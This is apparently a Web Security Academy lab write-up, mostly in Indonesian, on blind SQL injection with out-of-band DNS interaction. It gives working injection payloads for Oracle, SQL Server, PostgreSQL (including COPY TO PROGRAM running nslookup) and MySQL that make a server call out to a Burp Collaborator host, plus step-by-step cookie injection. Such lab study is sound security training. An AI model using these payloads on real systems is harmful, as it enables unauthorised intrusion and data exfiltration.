
# Blind SQL injection with out-of-band interaction

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

Learning path: If you're following our learning path, please note that the suggested solution for this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/blind

- https://portswigger.net/web-security/sql-injection/cheat-sheet




---------------------------------------------
# **Simple Proof of Concept: Blind SQL Injection with Out-of-Band Interaction**

## **Langkah Mudah Eksploitasi**

### **1. Penjelasan Singkat**
Blind SQL injection ini memanfaatkan interaksi out-of-band (OOB) melalui DNS untuk membuktikan kerentanan. Payload akan menyebabkan aplikasi melakukan DNS lookup ke domain Burp Collaborator.

---

### **2. Payload untuk Database Umum**
Berikut adalah payload sederhana untuk setiap jenis database:

#### **Oracle**
```sql
'+UNION SELECT EXTRACTVALUE(xmltype('<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

#### **Microsoft SQL Server**
```sql
'+AND exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--
```

#### **PostgreSQL**
```sql
'+|| (COPY (SELECT '') TO PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN')--
```

#### **MySQL**
```sql
'+AND LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')--
```

---

# **Penjelasan dan Langkah-Langkah Eksploitasi Blind SQL Injection dengan Out-of-Band Interaction**

### **Penjelasan Singkat**
Blind SQL Injection dengan metode Out-of-Band (OOB) memanfaatkan interaksi eksternal, seperti DNS lookup, untuk memvalidasi bahwa injeksi berhasil dilakukan. Pada lab ini, injeksi SQL dibuat untuk memaksa server melakukan lookup ke domain Burp Collaborator, membuktikan bahwa payload telah dieksekusi.

---

### **Payload Detail**
Payload berikut digunakan pada database Oracle:

```sql
'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://tqn6voesrxt08naj53o2tp0ztqzhn7bw.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```

#### **Penjelasan Detail Query:**
1. **`UNION SELECT`**:
   - Menggabungkan hasil query asli dengan query injeksi.
   - Digunakan untuk menambahkan perintah injeksi tanpa merusak query asli.

2. **`EXTRACTVALUE(xmltype(...), '/l')`**:
   - **`EXTRACTVALUE`**: Fungsi Oracle yang mengekstrak nilai dari dokumen XML berdasarkan jalur XPath.
   - **`xmltype(...)`**: Membuat dokumen XML dari string yang diberikan.

3. **Payload XML**:
   - **`<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://tqn6voesrxt08naj53o2tp0ztqzhn7bw.oastify.com/"> %remote;]>`**:
     - Membuat entitas eksternal (`%remote`) yang mengacu ke URL (Burp Collaborator).
     - Saat XML diproses, server mencoba mengakses URL tersebut, menghasilkan DNS lookup ke domain Burp Collaborator.

4. **`FROM dual`**:
   - **`dual`** adalah tabel dummy bawaan Oracle untuk menjalankan query sederhana.

5. **Encoded Characters**:
   - **`%3f`, `%3b`, dan `%25`**:
     - Encoding untuk karakter `?`, `;`, dan `%`.
     - Encoding ini memastikan payload dapat dikirim melalui URL tanpa diubah.

6. **`--`**:
   - Komentar SQL untuk mengabaikan sisa query asli, memastikan hanya payload yang dieksekusi.

---

### **Langkah-Langkah Eksploitasi**
1. **Siapkan Burp Collaborator**:
   - Buka **Burp Collaborator** di Burp Suite.
   - Salin subdomain unik, misalnya: `tqn6voesrxt08naj53o2tp0ztqzhn7bw.oastify.com`.

2. **Masukkan Payload**:
   - Tempelkan payload di parameter **TrackingId** menggunakan subdomain Burp Collaborator Anda.
   - Contoh:
     ```plaintext
     TrackingId=ABC123'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://tqn6voesrxt08naj53o2tp0ztqzhn7bw.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
     ```

3. **Monitor DNS Lookup**:
   - Buka **Burp Collaborator** dan cek log untuk memastikan server melakukan DNS lookup ke domain Anda.

---

### **Hasil Eksploitasi**
Jika server rentan, Anda akan melihat log di Burp Collaborator dengan detail lookup dari server ke subdomain yang Anda gunakan. Hal ini membuktikan bahwa payload berhasil dieksekusi, dan server melakukan komunikasi ke domain eksternal seperti yang diinstruksikan. 

Payload ini sangat efektif untuk membuktikan kerentanan pada skenario Blind SQL Injection dengan Out-of-Band Interaction.




![img](images/Blind%20SQL%20injection%20with%20out-of-band%20interaction/1.png)




![img](images/Blind%20SQL%20injection%20with%20out-of-band%20interaction/2.png)
